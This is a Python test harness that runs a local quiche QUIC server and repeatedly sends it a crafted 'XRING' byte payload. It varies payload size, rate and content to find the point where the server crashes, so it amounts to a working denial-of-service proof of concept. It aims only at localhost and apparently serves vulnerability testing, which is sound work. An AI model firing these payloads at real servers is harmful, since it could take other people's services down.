#!/usr/bin/env python3
"""
Advanced QUIC XRING Dynamic Test Suite
Comprehensive testing with automated monitoring and analysis
"""

import subprocess
import sys
import os
import json
import tempfile
import time
import signal
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional
from datetime import datetime
import threading
import queue

# Configuration
QUICTE_SERVER = "/opt/homebrew/bin/quiche-server"
QUICTE_CLIENT = "/opt/homebrew/bin/quiche-client"
SERVER_PORT = 4433
SERVER_HOST = "127.0.0.1"
TEMP_DIR = tempfile.mkdtemp(prefix="quic_advanced_suite_")
CERT_DIR = f"{TEMP_DIR}/certs"
PAYLOAD_FILE = f"{TEMP_DIR}/xring_payload.bin"

@dataclass
class TestResult:
    timestamp: str
    test_name: str
    status: str
    details: Dict
    crash_detected: bool = False
    response_time_ms: Optional[float] = None

    def to_dict(self):
        return asdict(self)

class AdvancedTestSuite:
    def __init__(self):
        self.server_process = None
        self.test_results: List[TestResult] = []
        self.log_queue = queue.Queue()
    
    def generate_certs(self) -> str:
        """Generate certificates for quiche-server"""
        os.makedirs(CERT_DIR, exist_ok=True)
        
        subprocess.run([
            "openssl", "genrsa", "-out", f"{CERT_DIR}/server.key", "2048"
        ], capture_output=True)
        
        subprocess.run([
            "openssl", "req", "-new", "-x509",
            "-key", f"{CERT_DIR}/server.key",
            "-out", f"{CERT_DIR}/server.crt",
            "-days", "365",
            "-subj", "/CN=localhost"
        ], capture_output=True)
        
        return f"{CERT_DIR}/server.crt"
    
    def generate_payload(self, size: int = 260) -> bytes:
        """Generate XRING payload of specified size"""
        payload = bytearray()
        
        if size >= 260:
            # Full XRING sequence
            payload.extend([0x20, 0x40])
            for _ in range(61):
                payload.extend([0x40, 1, ord('x'), 0])
            payload.extend([0x40, 5, ord('A'), ord('A'), ord('A'), ord('A'), ord('A'), 
                           5, ord('B'), ord('B'), ord('B'), ord('B'), ord('B')])
            payload.extend([0x20, 0x41])
            payload = payload[:size]
        else:
            # Smaller payloads for threshold testing
            payload.extend([0x20, 0x40])
            payload = payload[:size]
        
        with open(PAYLOAD_FILE, "wb") as f:
            f.write(payload)
        
        return bytes(payload)
    
    def start_server(self) -> bool:
        """Start quiche-server with monitoring"""
        print(f"\n🚀 Starting quiche-server on port {SERVER_PORT}...")
        
        try:
            self.server_process = subprocess.Popen(
                [
                    QUICTE_SERVER,
                    f"--listen={SERVER_HOST}:{SERVER_PORT}",
                    f"--cert={CERT_DIR}/server.crt",
                    f"--key={CERT_DIR}/server.key",
                    f"--root={TEMP_DIR}/",
                    "--idle-timeout=10000"
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Wait for server to be ready
            time.sleep(3)
            
            if self.server_process.poll() is None:
                print("✅ Server started successfully")
                return True
            else:
                print("❌ Server failed to start")
                output = self.server_process.stdout.read()
                print(f"Server output: {output[:500]}")
                return False
                
        except Exception as e:
            print(f"❌ Error starting server: {e}")
            return False
    
    def stop_server(self):
        """Stop quiche-server gracefully"""
        if self.server_process:
            self.server_process.terminate()
            try:
                self.server_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.server_process.kill()
            self.server_process = None
    
    def run_attack(self, payload: bytes, test_name: str = "xring_attack") -> TestResult:
        """Execute XRING attack sequence"""
        start_time = time.time()
        
        try:
            result = subprocess.run(
                [
                    QUICTE_CLIENT,
                    f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
                    "--no-verify",
                    "--body", PAYLOAD_FILE,
                    f"https://{SERVER_HOST}:{SERVER_PORT}/upload"
                ],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            response_time = (time.time() - start_time) * 1000
            server_alive = self.server_process and self.server_process.poll() is None
            
            print(f"📊 {test_name}: exit code {result.returncode}, server alive: {server_alive}")
            
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name=test_name,
                status="completed" if server_alive else "crashed",
                details={
                    "response_time_ms": round(response_time, 2),
                    "server_alive": server_alive,
                    "payload_size": len(payload),
                    "exit_code": result.returncode
                },
                crash_detected=not server_alive,
                response_time_ms=response_time
            )
            
        except subprocess.TimeoutExpired:
            print(f"❌ {test_name} timed out")
            self.stop_server()
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name=test_name,
                status="error",
                details={"error": "Timeout"},
                crash_detected=True,
                response_time_ms=None
            )
        except Exception as e:
            print(f"❌ {test_name} failed: {e}")
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name=test_name,
                status="error",
                details={"error": str(e)},
                crash_detected=False,
                response_time_ms=None
            )
    
    def test_payload_thresholds(self) -> List[TestResult]:
        """Test different payload sizes to find vulnerability threshold"""
        print("\n📊 Testing payload size thresholds...")
        
        sizes = [256, 260, 264, 512, 1024, 2048]
        results = []
        
        for size in sizes:
            payload = self.generate_payload(size)
            result = self.run_attack(payload, f"payload_size_{size}")
            results.append(result)
            time.sleep(1)
            
            if result.crash_detected:
                print(f"🚨 CRASH DETECTED at size {size}!")
                break
        
        return results
    
    def test_attack_frequency(self, max_attacks: int = 10) -> List[TestResult]:
        """Test rapid-fire attack sequences"""
        print(f"\n⚡ Testing rapid-fire attacks (max: {max_attacks})...")
        
        payload = self.generate_payload()
        results = []
        
        for i in range(max_attacks):
            result = self.run_attack(payload, f"rapid_attack_{i+1}")
            results.append(result)
            
            if result.crash_detected:
                print(f"🚨 CRASH on attack {i+1}!")
                break
            
            time.sleep(0.5)  # Rapid succession
        
        return results
    
    def test_payload_variations(self) -> List[TestResult]:
        """Test different attack payload variations"""
        print("\n🔬 Testing payload variations...")
        
        variations = [
            (b'\x20\x40' + b'\x40\x01x\x00' * 61 + b'\x20\x41', "Standard XRING"),
            (b'\x20\x40' + b'\x40\x01y\x00' * 61 + b'\x20\x41', "Variant 1"),
            (b'\x20\x40' + b'\x40\x01z\x00' * 61 + b'\x20\x41', "Variant 2"),
            (b'\x20\x42' + b'\x40\x01x\x00' * 61 + b'\x20\x43', "Modified caps"),
        ]
        
        results = []
        for payload, name in variations:
            # Write to payload file
            with open(PAYLOAD_FILE, "wb") as f:
                f.write(payload)
            
            result = self.run_attack(payload, name)
            results.append(result)
            time.sleep(1)
            
            if result.crash_detected:
                print(f"🚨 CRASH on {name}!")
                break
        
        return results
    
    def run_comprehensive_suite(self):
        """Run complete test suite"""
        print("=" * 60)
        print("ADVANCED QUIC XRING TEST SUITE")
        print("=" * 60)
        
        # Generate certificates and payload
        print("\n🔧 Preparing test environment...")
        self.generate_certs()
        payload = self.generate_payload()
        print(f"✅ Payload generated: {len(payload)} bytes")
        
        # Start server
        if not self.start_server():
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="comprehensive_suite",
                status="failed",
                details={"error": "Server failed to start"}
            )
        
        # Test 1: Basic connectivity
        print("\n📡 Test 1: Basic connectivity...")
        try:
            result = subprocess.run(
                [QUICTE_CLIENT, f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
                 "--no-verify", f"https://{SERVER_HOST}:{SERVER_PORT}/"],
                capture_output=True, text=True, timeout=10
            )
            print(f"✅ Basic connectivity: {result.returncode}")
        except Exception as e:
            print(f"❌ Basic connectivity failed: {e}")
        
        # Test 2: Payload size threshold
        threshold_results = self.test_payload_thresholds()
        self.test_results.extend(threshold_results)
        
        # Test 3: Rapid-fire attacks
        rapid_results = self.test_attack_frequency(10)
        self.test_results.extend(rapid_results)
        
        # Test 4: Payload variations
        variation_results = self.test_payload_variations()
        self.test_results.extend(variation_results)
        
        # Stop server
        self.stop_server()
        
        # Save results
        results_file = f"{TEMP_DIR}/comprehensive_results.json"
        with open(results_file, "w") as f:
            json.dump([r.to_dict() for r in self.test_results], f, indent=2)
        
        print("\n" + "=" * 60)
        print("TEST SUITE COMPLETED")
        print("=" * 60)
        
        # Summary
        total_tests = len(self.test_results)
        crashes = sum(1 for r in self.test_results if r.crash_detected)
        passed = total_tests - crashes
        
        print(f"📊 Total tests: {total_tests}")
        print(f"✅ Passed: {passed}")
        print(f"❌ Crashes: {crashes}")
        print(f"📄 Results saved to: {results_file}")
        
        return TestResult(
            timestamp=datetime.now().isoformat(),
            test_name="comprehensive_suite",
            status="completed",
            details={
                "total_tests": total_tests,
                "passed": passed,
                "crashes": crashes
            }
        )

if __name__ == "__main__":
    suite = AdvancedTestSuite()
    suite.run_comprehensive_suite()
